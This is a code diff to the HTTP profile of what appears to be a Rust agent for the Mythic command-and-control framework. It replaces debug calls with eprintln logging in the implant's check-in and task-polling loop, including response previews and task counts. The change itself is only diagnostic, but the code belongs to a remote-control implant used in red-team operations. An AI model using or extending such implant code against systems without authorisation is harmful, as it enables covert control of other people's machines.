@@ -402,7 +402,7 @@ impl Profile for HttpProfile {
             }
         }
 
-        utils::print_debug("HTTP: Checkin successful, starting main loop");
+        eprintln!("[agent] Checkin OK, entering poll loop with UUID={}", self.uuid.read().unwrap());
 
         // Main polling loop
         while !self.should_stop.load(Ordering::Relaxed) && !self.past_killdate() {
@@ -424,15 +424,24 @@ impl Profile for HttpProfile {
             };
             // Send and process response
             if let Some(response_bytes) = self.send_message(&msg_json).await {
+                let preview = String::from_utf8_lossy(
+                    &response_bytes[..std::cmp::min(response_bytes.len(), 300)]
+                );
+                eprintln!("[agent] Poll response ({}B): {}", response_bytes.len(), preview);
                 match serde_json::from_slice::<crate::structs::MythicMessageResponse>(&response_bytes)
                 {
                     Ok(mythic_response) => {
+                        if !mythic_response.tasks.is_empty() {
+                            eprintln!("[agent] Got {} tasks", mythic_response.tasks.len());
+                        }
                         tasks::handle_message_from_mythic(mythic_response).await;
                     }
                     Err(e) => {
-                        utils::print_debug(&format!("Failed to parse poll response: {}", e));
+                        eprintln!("[agent] Failed to parse poll response: {}", e);
                     }
                 }
+            } else {
+                eprintln!("[agent] Poll: no response (send_message returned None)");
             }
         }
 
